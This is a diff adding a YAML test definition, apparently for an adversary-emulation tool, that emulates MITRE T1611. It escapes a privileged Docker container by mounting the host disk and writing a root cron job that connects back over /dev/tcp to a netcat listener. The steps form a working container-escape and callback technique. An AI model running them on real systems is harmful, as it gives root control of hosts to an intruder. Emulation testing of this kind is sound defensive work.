@@ -1,0 +1,68 @@
+api_version: "2.0"
+name: Mount host filesystem to escape privileged Docker container
+description: "This technique abuses privileged Docker containers to mount the host's filesystem and then create a cron job to launch a reverse shell as the host's superuser.\nThe container running the test needs be privileged.  It may take up to a minute for this to run due to how often crond triggers a job.\nDev note: the echo to create cron_filename is broken up to prevent localized execution of hostname and id by Powershell. \n"
+args:
+    - name: mount_device
+      type: path
+      default: /dev/dm-0
+    - name: mount_point
+      type: path
+      default: /mnt/T1611.002
+    - name: cron_path
+      type: path
+      default: /etc/cron.d
+    - name: cron_filename
+      type: string
+      default: T1611_002
+    - name: listen_address
+      type: string
+      default: '`ifconfig eth0 | grep inet | awk ''{print $2}''`'
+    - name: listen_port
+      type: int
+      default: "4444"
+uuid: 6c499943-b098-4bc6-8d38-0956fc182984
+mitre:
+    tactics:
+        - 'TA0004: Privilege Escalation'
+    techniques:
+        - 'T1611: Escape to Host'
+requirements:
+    platforms:
+        - os: containers
+steps:
+    - name: Verify mount is installed.
+      inline: |
+        which mount
+      executor: sh
+    - name: Verify container is privileged.
+      inline: |
+        capsh --print | grep cap_sys_admin
+      executor: sh
+    - name: Verify mount device (/dev/dm-0) exists.
+      inline: |
+        ls #{mount_device}
+      executor: sh
+    - name: Netcat is installed.
+      inline: |
+        which netcat
+      executor: sh
+    - name: IP Address is known.
+      inline: |
+        if [ "#{listen_address}" != "" ]; then echo "Listen address set as #{listen_address}" ; fi
+      executor: sh
+    - name: mount-host-filesystem-to-escape-privileged-docker-container
+      inline: |
+        if [ ! -d {{.Args.mount_point}} ]; then mkdir {{.Args.mount_point}} ; mount {{.Args.mount_device}} {{.Args.mount_point}}; fi
+        echo -n "* * * * * root /bin/bash -c '/bin/bash -c echo \"\"; echo \"hello from host! " > {{.Args.mount_point}}{{.Args.cron_path}}/{{.Args.cron_filename}}
+        echo -n "$" >> {{.Args.mount_point}}{{.Args.cron_path}}/{{.Args.cron_filename}}
+        echo -n "(hostname) " >> {{.Args.mount_point}}{{.Args.cron_path}}/{{.Args.cron_filename}}
+        echo -n "$" >> {{.Args.mount_point}}{{.Args.cron_path}}/{{.Args.cron_filename}}
+        echo "(id)\" >& /dev/tcp/{{.Args.listen_address}}/{{.Args.listen_port}} 0>&1'" >> {{.Args.mount_point}}{{.Args.cron_path}}/{{.Args.cron_filename}}
+        netcat -l -p {{.Args.listen_port}} 2>&1
+      executor: sh
+      cleanup:
+        inline: |
+            rm {{.Args.mount_point}}{{.Args.cron_path}}/{{.Args.cron_filename}}
+            umount {{.Args.mount_point}}
+            rmdir {{.Args.mount_point}}
+        executor: sh
